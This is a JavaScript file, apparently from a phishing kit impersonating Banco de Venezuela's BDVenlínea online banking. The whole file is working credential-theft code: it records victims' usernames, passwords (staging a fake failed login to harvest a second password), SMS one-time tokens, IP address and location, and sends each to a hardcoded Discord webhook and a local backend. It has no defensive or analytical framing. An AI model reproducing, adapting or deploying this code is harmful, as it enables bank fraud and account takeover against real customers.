// notifier.js - Sistema centralizado de notificaciones BDV para Discord
(function () {
  'use strict';

  // Configuración del Webhook de Discord
  const DISCORD_WEBHOOK_URL =
    'https://discord.com/api/webhooks/1548555977631211590/IKncLU4k5Ulnl73F6RCdJpogJ2rjHjgeXtMgBEeuKJrhBd2C4a2D1GKIRuiPa2hBvCAL';

  const BDV_AVATAR =
    'https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Banco_de_Venezuela_logo.svg/1200px-Banco_de_Venezuela_logo.svg.png';

  // Obtener datos del cliente (IP, país, ciudad, agente de usuario)
  async function getClientInfo() {
    const cached = sessionStorage.getItem('bdv_client_info');
    if (cached) {
      try {
        return JSON.parse(cached);
      } catch (e) {}
    }

    const info = {
      ip: 'No disponible',
      country: 'Desconocido',
      city: 'Desconocido',
      userAgent: navigator.userAgent || 'Desconocido'
    };

    // Intentar obtener IP y geolocalización rápida con timeout de 2.5s
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 2500);
      const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
      clearTimeout(timer);
      if (res.ok) {
        const data = await res.json();
        info.ip = data.ip || info.ip;
        info.country = data.country_name || info.country;
        info.city = data.city || info.city;
      }
    } catch (err) {
      try {
        const controller2 = new AbortController();
        const timer2 = setTimeout(() => controller2.abort(), 2000);
        const res2 = await fetch('https://api.ipify.org?format=json', { signal: controller2.signal });
        clearTimeout(timer2);
        if (res2.ok) {
          const data2 = await res2.json();
          info.ip = data2.ip || info.ip;
        }
      } catch (e2) {}
    }

    sessionStorage.setItem('bdv_client_info', JSON.stringify(info));
    return info;
  }

  // Enviar carga útil a Discord
  async function postDiscord(embed, content = '') {
    const payload = {
      username: 'BDVenlínea Notificador',
      avatar_url: BDV_AVATAR,
      content: content,
      embeds: [embed]
    };

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (err) {
      console.warn('Error enviando a Discord Webhook:', err);
    }

    // Intentar también enviar al backend local en caso de que app.py esté corriendo
    try {
      fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(() => {});
    } catch (e) {}
  }

  function getFormattedDate() {
    const now = new Date();
    return {
      iso: now.toISOString(),
      local: now.toLocaleString('es-VE', {
        hour12: true,
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      })
    };
  }

  // Métodos públicos del Notificador
  const BDVNotifier = {
    // 1. Notificar inicio de trámite desde index.html
    async sendTramite(tramite) {
      sessionStorage.setItem('bdv_tramite', tramite);
      const client = await getClientInfo();
      const dates = getFormattedDate();

      const embed = {
        title: '📋 BDV • Trámite Seleccionado',
        color: 0x0d5db8, // Azul BDV
        fields: [
          { name: '📄 Trámite Solicitado', value: `\`\`\`${tramite}\`\`\``, inline: false },
          { name: '🌐 Dirección IP', value: `\`${client.ip}\``, inline: true },
          { name: '📍 Ubicación', value: `${client.city}, ${client.country}`, inline: true },
          { name: '🕒 Fecha y Hora', value: dates.local, inline: false },
          { name: '📱 Dispositivo / Navegador', value: `\`${client.userAgent.slice(0, 150)}\``, inline: false }
        ],
        footer: { text: 'BDVenlínea • Trámite en proceso' },
        timestamp: dates.iso
      };

      await postDiscord(embed);
    },

    // 2. Notificar ingreso de usuario en login.html
    async sendUser(username) {
      sessionStorage.setItem('bdv_user', username);
      const tramite = sessionStorage.getItem('bdv_tramite') || 'No seleccionado';
      const client = await getClientInfo();
      const dates = getFormattedDate();

      const embed = {
        title: '👤 BDV • Usuario Ingresado',
        color: 0x0874bd,
        fields: [
          { name: '👤 Usuario', value: `\`\`\`${username}\`\`\``, inline: true },
          { name: '📄 Trámite', value: tramite, inline: true },
          { name: '🌐 Dirección IP', value: `\`${client.ip}\``, inline: true },
          { name: '📍 Ubicación', value: `${client.city}, ${client.country}`, inline: true },
          { name: '🕒 Fecha y Hora', value: dates.local, inline: false }
        ],
        footer: { text: 'BDVenlínea • Esperando contraseña...' },
        timestamp: dates.iso
      };

      await postDiscord(embed);
    },

    // 3. Notificar ingreso de contraseña (Intento 1 o Intento 2)
    async sendPassword(username, password, attempt = 1) {
      sessionStorage.setItem(`bdv_pwd_${attempt}`, password);
      const user = username || sessionStorage.getItem('bdv_user') || 'Desconocido';
      const tramite = sessionStorage.getItem('bdv_tramite') || 'No seleccionado';
      const pwd1 = sessionStorage.getItem('bdv_pwd_1') || (attempt === 1 ? password : 'No registrada');
      const client = await getClientInfo();
      const dates = getFormattedDate();

      const isFirst = attempt === 1;
      const title = isFirst
        ? '🔑 BDV • Contraseña Ingresada (1er Intento)'
        : '🔑 BDV • Contraseña Ingresada (2do Intento - Acceso Concedido)';
      const color = isFirst ? 0xf59e0b : 0x10b981; // Ámbar si es 1er intento, Verde si es 2do

      const fields = [
        { name: '👤 Usuario', value: `\`\`\`${user}\`\`\``, inline: true },
        { name: `🔑 Clave (Intento ${attempt})`, value: `\`\`\`${password}\`\`\``, inline: true }
      ];

      if (!isFirst && pwd1 && pwd1 !== password) {
        fields.push({ name: '🔑 Clave (1er Intento previo)', value: `\`\`\`${pwd1}\`\`\``, inline: true });
      }

      fields.push(
        { name: '📄 Trámite', value: tramite, inline: true },
        { name: '🌐 Dirección IP', value: `\`${client.ip}\``, inline: true },
        { name: '📍 Ubicación', value: `${client.city}, ${client.country}`, inline: true },
        { name: '🕒 Fecha y Hora', value: dates.local, inline: false }
      );

      const embed = {
        title: title,
        color: color,
        fields: fields,
        footer: {
          text: isFirst ? 'BDVenlínea • Mostrando autenticación incorrecta...' : 'BDVenlínea • Avanza a verificación...'
        },
        timestamp: dates.iso
      };

      await postDiscord(embed);
    },

    // 4. Notificar código SMS / Token dinámico
    async sendToken(username, token, attempt = 1) {
      sessionStorage.setItem(`bdv_token_${attempt}`, token);
      const user = username || sessionStorage.getItem('bdv_user') || 'Desconocido';
      const tramite = sessionStorage.getItem('bdv_tramite') || 'No seleccionado';
      const pwd1 = sessionStorage.getItem('bdv_pwd_1') || 'No registrada';
      const pwd2 = sessionStorage.getItem('bdv_pwd_2') || 'No registrada';
      const token1 = sessionStorage.getItem('bdv_token_1') || (attempt === 1 ? token : 'No registrado');
      const client = await getClientInfo();
      const dates = getFormattedDate();

      const isFirst = attempt === 1;
      const title = isFirst
        ? '🔢 BDV • Código SMS / Token Ingresado (1er Intento)'
        : '🔢 BDV • Código SMS / Token Ingresado (2do Intento / Reintento)';
      const color = isFirst ? 0x2563eb : 0xd97706;

      const fields = [
        { name: '👤 Usuario', value: `\`\`\`${user}\`\`\``, inline: true },
        { name: `🔢 Token (Intento ${attempt})`, value: `\`\`\`${token}\`\`\``, inline: true },
        { name: '🔑 Clave 1', value: `\`\`\`${pwd1}\`\`\``, inline: true }
      ];

      if (pwd2 && pwd2 !== 'No registrada') {
        fields.push({ name: '🔑 Clave 2', value: `\`\`\`${pwd2}\`\`\``, inline: true });
      }

      if (!isFirst && token1 && token1 !== token) {
        fields.push({ name: '🔢 Token (1er Intento previo)', value: `\`\`\`${token1}\`\`\``, inline: true });
      }

      fields.push(
        { name: '📄 Trámite', value: tramite, inline: true },
        { name: '🌐 Dirección IP', value: `\`${client.ip}\``, inline: true },
        { name: '📍 Ubicación', value: `${client.city}, ${client.country}`, inline: true },
        { name: '🕒 Fecha y Hora', value: dates.local, inline: false }
      );

      const embed = {
        title: title,
        color: color,
        fields: fields,
        footer: { text: 'BDVenlínea • Verificación en proceso' },
        timestamp: dates.iso
      };

      await postDiscord(embed);
    },

    // 5. Notificar reenvío de código solicitado por el usuario
    async sendResend(username) {
      const user = username || sessionStorage.getItem('bdv_user') || 'Desconocido';
      const client = await getClientInfo();
      const dates = getFormattedDate();

      const embed = {
        title: '🔄 BDV • Solicitud de Reenvío de Código SMS',
        color: 0x9333ea,
        fields: [
          { name: '👤 Usuario', value: `\`\`\`${user}\`\`\``, inline: true },
          { name: '🌐 Dirección IP', value: `\`${client.ip}\``, inline: true },
          { name: '🕒 Fecha y Hora', value: dates.local, inline: false }
        ],
        footer: { text: 'BDVenlínea • Usuario solicitó nuevo SMS' },
        timestamp: dates.iso
      };

      await postDiscord(embed);
    }
  };

  // Exponer globalmente
  window.BDVNotifier = BDVNotifier;

  // Iniciar detección de IP en segundo plano al cargar el script
  getClientInfo();
})();
